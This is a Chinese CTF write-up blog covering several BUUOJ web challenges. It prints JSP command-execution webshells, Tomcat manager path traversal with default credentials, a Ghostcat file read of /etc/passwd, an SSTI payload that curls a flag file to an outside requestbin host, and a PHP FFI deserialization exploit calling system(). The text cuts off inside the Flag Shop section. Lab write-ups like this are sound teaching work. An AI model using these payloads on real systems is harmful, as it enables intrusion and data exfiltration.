    <content type="html"><![CDATA[<h3 id="0x-01-PWNHUB-公开赛-2018-傻-fufu-的工作日"><a href="#0x-01-PWNHUB-公开赛-2018-傻-fufu-的工作日" class="headerlink" title="0x 01 [PWNHUB 公开赛 2018]傻 fufu 的工作日"></a>0x 01 [PWNHUB 公开赛 2018]傻 fufu 的工作日</h3><ul><li><p>考点</p><p>php数组特性</p></li><li><p>解题步骤</p></li></ul><ol><li>题目存在源代码泄露，下载UploadFile.class.php.bak,发现使用的是PHP免扩展加密根据这篇文章介绍<a href="https://blog.csdn.net/ababab12345/article/details/90169678，使用解密工具解密，分析源代码定位到关键部分如下：" target="_blank" rel="noopener">https://blog.csdn.net/ababab12345/article/details/90169678，使用解密工具解密，分析源代码定位到关键部分如下：</a></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if(!in_array($filename[count($filename)-1], $this-&gt;allow_ext)) &#123;</span><br><span class="line">        return $this-&gt;error(&#39;只允许上传图片文件&#39;);</span><br><span class="line">&#125;</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 用.分割文件名，只保留首尾两个字符串，防御Apache解析漏洞</span><br><span class="line">$origin_name &#x3D; current($filename);   &#x2F;&#x2F;返回数组中的当前单元</span><br><span class="line">$ext &#x3D; end($filename);  &#x2F;&#x2F;将数组内部指针指向最后一个元素，并返回该元素的值（如果成功）。</span><br><span class="line">$new_name &#x3D; ($this-&gt;new_name ? $this-&gt;new_name : $origin_name) . &#39;.&#39; . $ext;</span><br><span class="line">$target_fullpath &#x3D; $this-&gt;dist_path . DIRECTORY_SEPARATOR . $new_name;</span><br></pre></td></tr></table></figure><p>判断后缀名是否在白名单中使用了<code>$filename[count($filename) - 1]</code>，而最后字符合成文件名的时候使用了<code>end($filename)</code>。两者的区别是，前者是通过下标来确定，后者则是返回数组的最后一个元素。可以通过数组绕过：</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200401221558883.png" alt></p><p>在跟目录得到flag</p><h3 id="0x-02-WUSTCTF2020-Train-Yourself-To-Be-Godly"><a href="#0x-02-WUSTCTF2020-Train-Yourself-To-Be-Godly" class="headerlink" title="0x 02 [WUSTCTF2020]Train Yourself To Be Godly"></a>0x 02 [WUSTCTF2020]Train Yourself To Be Godly</h3><ul><li><p>考点</p><p>tomcat解析漏洞</p></li><li><p>解题过程</p></li></ul><p>补充知识：apache中的tomcat/webapps目录如下</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/GnhzdO.png" alt></p><p>manage目录是可以上传WAR文件部署服务，也就是说可以通过manage目录实现文件上传，继而实现木马上传</p><p>URL路径参数不规范引发的问题:</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/Gn4FSA.png" alt></p><p><a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf</a></p><p>文章告诉我们可以通过 /..;/manager/html 进入到manager页面</p><ol><li>随便加一串路径，根据报错信息得知当前的tomcat的root路径为examlpes</li></ol><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403204510802.png" alt></p><ol start="2"><li>访问<code>/..;/manager/html</code>目录穿越到 manager 需要输入密码验证，这里是弱密码 tomcat/tomcat</li></ol><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403204629584.png" alt></p><p>接下来是后台getshell过程，webshell构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a &#x3D; -1;</span><br><span class="line">        byte[] b &#x3D; new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>用<code>jar cvf lxj.war webshell.jsp</code>命令将webshell.jsp打包成war,然后上传文件，发现回显404，根据报错信息明显路径拼结完是example/manager/html/upload，缺少一个/..;/，加一个再试。接着会发现401，未授权访问。是缺少了header里的认证，当然在成功访问后台时抓包也能看到自己的header中有认证头。<br> <code>Authorization: Basic dG9tY2F0OnRvbWNhdA==</code>后面就是tomcat:tomcat的base64编码。继续上传，发现403。一般问题就出在cookie或者session没给，www没有目录访问权限身上。按照目前的思路来说，不会出现服务器权限不足的问题，那就只能是cookie没添。利用burpsuit从头开始抓包，在访问/..;/manager/html出现了Set-Cookie(set-Cookie的Path是指此cookie只在Path目录下起作用)，那么我们403的问题就迎刃而解，只需要将/example换成Path参数指定的/manage就行，再把cookie加上就完事了。</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403205226924.png" alt></p><p>最后访问webshell，得到flag</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403205311373.png" alt></p><p>参考资料：</p><blockquote><p><a href="https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#train-yourself-to-be-godly-1-solves" target="_blank" rel="noopener">https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#train-yourself-to-be-godly-1-solves</a></p><p><a href="https://www.jianshu.com/p/368d6c41a2f6" target="_blank" rel="noopener">https://www.jianshu.com/p/368d6c41a2f6</a></p></blockquote><h3 id="0x-03-WUSTCTF2020-easyweb"><a href="#0x-03-WUSTCTF2020-easyweb" class="headerlink" title="0x 03 [WUSTCTF2020]easyweb"></a>0x 03 [WUSTCTF2020]easyweb</h3><ul><li><p>考点</p><p>CVE-2020-1938幽灵猫文件包含</p></li><li><p>解题过程</p></li></ul><ol><li>题目打开是一个文件上传，传一个文件上传上去会返回一个之前上传的文件下载，经过测试发现此处存在任意文件读取，可以随意下载：</li></ol><p>尝试WEB-INF下的web.xml:<code>/download?file=../web.xml</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns&#x3D;&quot;http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee&quot;</span><br><span class="line">         xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee&#x2F;web-app_4_0.xsd&quot;</span><br><span class="line">         version&#x3D;&quot;4.0&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;context-param&gt;</span><br><span class="line">        &lt;param-name&gt;webAppRootKey&lt;&#x2F;param-name&gt;</span><br><span class="line">        &lt;param-value&gt;tomcat.ajp&lt;&#x2F;param-value&gt;</span><br><span class="line">    &lt;&#x2F;context-param&gt;</span><br><span class="line"></span><br><span class="line">    &lt;listener&gt;</span><br><span class="line">        &lt;listener-class&gt;</span><br><span class="line">            org.springframework.web.util.WebAppRootListener</span><br><span class="line">        &lt;&#x2F;listener-class&gt;</span><br><span class="line">    &lt;&#x2F;listener&gt;</span><br><span class="line"></span><br><span class="line">    &lt;welcome-file-list&gt;</span><br><span class="line">        &lt;welcome-file&gt;&#x2F;WEB-INF&#x2F;views&#x2F;index.jsp&lt;&#x2F;welcome-file&gt;</span><br><span class="line">    &lt;&#x2F;welcome-file-list&gt;</span><br><span class="line"></span><br><span class="line">    &lt;error-page&gt;</span><br><span class="line">        &lt;exception-type&gt;java.lang.Throwable&lt;&#x2F;exception-type&gt;</span><br><span class="line">        &lt;location&gt;&#x2F;error&lt;&#x2F;location&gt;</span><br><span class="line">    &lt;&#x2F;error-page&gt;</span><br><span class="line">&lt;&#x2F;web-app&gt;</span><br></pre></td></tr></table></figure><p>尝试读取/etc/passwd:<code>/download?file=../../../../../../../etc/passwd</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:101:101::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:102:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:103:104:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-network:x:104:105:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-resolve:x:105:106:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-bus-proxy:x:106:107:systemd Bus Proxy,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure><p>使用CVE-2020-1938exp（<a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487/blob/master/ajpShooter.py）尝试进行文件读取。成功获取页面" target="_blank" rel="noopener">https://github.com/00theway/Ghostcat-CNVD-2020-10487/blob/master/ajpShooter.py）尝试进行文件读取。成功获取页面</a></p><blockquote><p>注意由于靶机在内网，所以IP地址是根据Lan Domain确定的，外网IP是内网穿透绑定的</p></blockquote><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403221242014.png" alt></p><p>构造exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import&#x3D;&quot;java.util.*,java.io.*&quot;%&gt;</span><br><span class="line">&lt;% </span><br><span class="line">out.println(&quot;Executing command&quot;);</span><br><span class="line">Process p &#x3D; Runtime.getRuntime().exec(&quot;ls &#x2F;&quot;);</span><br><span class="line">OutputStream os &#x3D; p.getOutputStream();</span><br><span class="line">InputStream in &#x3D; p.getInputStream();</span><br><span class="line">DataInputStream dis &#x3D; new DataInputStream(in);</span><br><span class="line">String disr &#x3D; dis.readLine();</span><br><span class="line">while ( disr !&#x3D; null ) &#123;</span><br><span class="line">  out.println(disr); </span><br><span class="line">  disr &#x3D; dis.readLine(); </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>上传成功后利用文件包含执行木马，最后<code>cat /flag78bt787it8b9b098j0k80k0ggg</code>得到flag</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403221421718.png" alt></p><p>参考资料：</p><blockquote><p><a href="https://www.gem-love.com/ctf/2176.html#easyweb" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2176.html#easyweb</a></p><p><a href="https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#easyweb-23-solves" target="_blank" rel="noopener">https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#easyweb-23-solves</a></p></blockquote><h3 id="0x-04-GWCTF-2019-你的名字"><a href="#0x-04-GWCTF-2019-你的名字" class="headerlink" title="0x 04 [GWCTF 2019]你的名字"></a>0x 04 [GWCTF 2019]你的名字</h3><ul><li><p>考点</p><p>ssti bypass</p></li><li><p>解题过程</p></li></ul><p>经过fuzz,后台强过滤匹配<code></code>，这里可以用if语句绕过。黑名单过滤如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">blacklist &#x3D; [&#39;import&#39;, &#39;getattr&#39;, &#39;os&#39;, &#39;class&#39;, &#39;subclasses&#39;, &#39;mro&#39;, &#39;request&#39;, &#39;args&#39;, &#39;eval&#39;, &#39;if&#39;, &#39;for&#39;,</span><br><span class="line">                 &#39; subprocess&#39;, &#39;file&#39;, &#39;open&#39;, &#39;popen&#39;, &#39;builtins&#39;, &#39;compile&#39;, &#39;execfile&#39;, &#39;from_pyfile&#39;, &#39;local&#39;,</span><br><span class="line">                 &#39;self&#39;, &#39;item&#39;, &#39;getitem&#39;, &#39;getattribute&#39;, &#39;func_globals&#39;, &#39;config&#39;]</span><br><span class="line">for no in blacklist:</span><br><span class="line">    while True:</span><br><span class="line">        if no in s:</span><br><span class="line">            s &#x3D; s.replace(no, &#39;&#39;)</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">return s</span><br></pre></td></tr></table></figure><p>这个逻辑是按顺序针对每个关键词过滤，只能应付双写绕过，可以用列表的最后一项来绕过过滤,payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% iconfigf &#39;&#39;.__claconfigss__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.func_glconfigobals.lineconfigcache.oconfigs.popconfigen(&#39;curl http:&#x2F;&#x2F;http.requconfigestbin.buuoj.cn&#x2F;1inhq4f1 -d &#96;cat &#x2F;flag_1s_Hera&#96;;&#39;) %&#125;1&#123;% endiconfigf %&#125;</span><br></pre></td></tr></table></figure><p>过滤之后最终的脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;1inhq4f1 -d &#96;cat &#x2F;flag_1s_Hera&#96;;&#39;) %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h3 id="0x-05-RCTF-2019-Nextphp"><a href="#0x-05-RCTF-2019-Nextphp" class="headerlink" title="0x 05 [RCTF 2019]Nextphp"></a>0x 05 [RCTF 2019]Nextphp</h3><ul><li><p>考点</p><p>php7.4新版本特性</p></li><li><p>解题过程</p></li></ul><ol><li>查看php配置信息，版本是7.4，同时发现过滤了大多数系统函数</li></ol><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414224651185.png" alt></p><ol start="2"><li>没有过滤scandir函数，payload:<code>?a=var_dump(scandir(&#39;/var/www/html&#39;));</code></li></ol><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414224810734.png" alt></p><ol start="3"><li>利用file_get_contents()查看preload.php源码，payload：<code>a=echo file_get_contents(&#39;preload.php&#39;);</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">final class A implements Serializable &#123;</span><br><span class="line">    protected $data &#x3D; [</span><br><span class="line">        &#39;ret&#39; &#x3D;&gt; null,</span><br><span class="line">        &#39;func&#39; &#x3D;&gt; &#39;print_r&#39;,</span><br><span class="line">        &#39;arg&#39; &#x3D;&gt; &#39;1&#39;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    private function run () &#123;</span><br><span class="line">        $this-&gt;data[&#39;ret&#39;] &#x3D; $this-&gt;data[&#39;func&#39;]($this-&gt;data[&#39;arg&#39;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __serialize(): array &#123;</span><br><span class="line">        return $this-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __unserialize(array $data) &#123;</span><br><span class="line">        array_merge($this-&gt;data, $data);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line">        $this-&gt;data &#x3D; unserialize($payload);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get ($key) &#123;</span><br><span class="line">        return $this-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __set ($key, $value) &#123;</span><br><span class="line">        throw new \Exception(&#39;No implemented&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __construct () &#123;</span><br><span class="line">        throw new \Exception(&#39;No implemented&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码是：PHP7.4新特性：新的自定义对象序列化机制：<a href="https://wiki.php.net/rfc/custom_object_serialization" target="_blank" rel="noopener">关于<strong>serialize和</strong>unserialize</a></p><ol start="4"><li>观察代码，发现对象反序列化时会执行run()方法</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private function run () &#123;</span><br><span class="line">        $this-&gt;data[&#39;ret&#39;] &#x3D; $this-&gt;data[&#39;func&#39;]($this-&gt;data[&#39;arg&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时发现可以结合__get魔法函数，获取对象data数组中的元素值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __get ($key) &#123;</span><br><span class="line">        return $this-&gt;data[$key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>根据题目文件名称提示关注php7.4的新特性，关于<code>opcache.preload</code>，参考这篇文章<a href="https://wiki.php.net/rfc/preload" target="_blank" rel="noopener">https://wiki.php.net/rfc/preload</a> 可知</li></ol><blockquote><p><a href="https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload" target="_blank" rel="noopener">opcache.preload</a> 是 <strong>PHP7.4</strong> 中新加入的功能。如果设置了 <a href="https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload" target="_blank" rel="noopener">opcache.preload</a> ，那么在所有Web应用程序运行之前，服务会先将设定的 <strong>preload</strong> 文件加载进内存中，使这些 <strong>preload</strong> 文件中的内容对之后的请求均可用。</p></blockquote><p>在这篇文档尾巴可以看到如下描述：</p><blockquote><p>In conjunction with ext/FFI (dangerous extension), we may allow FFI  functionality only in preloaded PHP files, but not in regular ones</p></blockquote><p>大概意思就是说允许在 <strong>preload</strong> 文件中使用 <strong>FFI</strong> 拓展，但是文档中说了 <strong>FFI</strong> 是一个危险的拓展，而这道题目却开启了 <strong>FFI</strong> 拓展。</p><p>构造exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A implements Serializable &#123;</span><br><span class="line">    protected $data &#x3D; [</span><br><span class="line">        &#39;ret&#39; &#x3D;&gt; null,</span><br><span class="line">        &#39;func&#39; &#x3D;&gt; &#39;FFI::cdef&#39;,</span><br><span class="line">        &#39;arg&#39; &#x3D;&gt; &#39;int system(const char *command);&#39;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line">        $this-&gt;data &#x3D; unserialize($payload);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __construct () &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new A();</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>最终payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;$a%3dunserialize(&#39;C%3A1%3A%22A%22%3A95%3A%7Ba%3A3%3A%7Bs%3A3%3A%22ret%22%3BN%3Bs%3A4%3A%22func%22%3Bs%3A9%3A%22FFI%3A%3Acdef%22%3Bs%3A3%3A%22arg%22%3Bs%3A32%3A%22int+system%28const+char+%2Acommand%29%3B%22%3B%7D%7D&#39;)-&gt;ret;var_dump($a-&gt;system(&quot;cat%20&#x2F;flag&gt;b.txt&quot;));</span><br></pre></td></tr></table></figure><p>最后访问b.txt得到flag</p><p>参考资料：</p><blockquote><p><a href="https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp" target="_blank" rel="noopener">https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp</a></p><p><a href="https://blog.csdn.net/qq_41809896/article/details/90384668" target="_blank" rel="noopener">https://blog.csdn.net/qq_41809896/article/details/90384668</a></p><p><a href="https://cjm00n.top/CTF/buuoj-writeup-2.html" target="_blank" rel="noopener">https://cjm00n.top/CTF/buuoj-writeup-2.html</a></p></blockquote><h3 id="0x-06-SCTF2019-Flag-Shop"><a href="#0x-06-SCTF2019-Flag-Shop" class="headerlink" title="0x 06 [SCTF2019]Flag Shop"></a>0x 06 [SCTF2019]Flag Shop</h3><ul><li><p>考点</p><p>erb模版注入</p></li><li><p>解题过程</p></li></ul><ol><li><p>页面打开是一个购买flag的页面，flag需要1e+27个JinKela才能购买，数量不够。访问robots.txt发现filebak目录，访问得到页面源代码</p></li><li><p>审计代码发现</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">get &quot;&#x2F;work&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth &#x3D; JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;</span><br><span class="line">  auth &#x3D; auth[0]</span><br><span class="line">  unless params[:SECRET].nil?</span><br><span class="line">    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(&#x2F;[0-9a-z]+&#x2F;)&#125;&quot;)</span><br><span class="line">      puts ENV[&quot;FLAG&quot;]</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  if params[:do] &#x3D;&#x3D; &quot;#&#123;params[:name][0,7]&#125; is working&quot; then</span><br><span class="line"></span><br><span class="line">    auth[&quot;jkl&quot;] &#x3D; auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)</span><br><span class="line">    auth &#x3D; JWT.encode 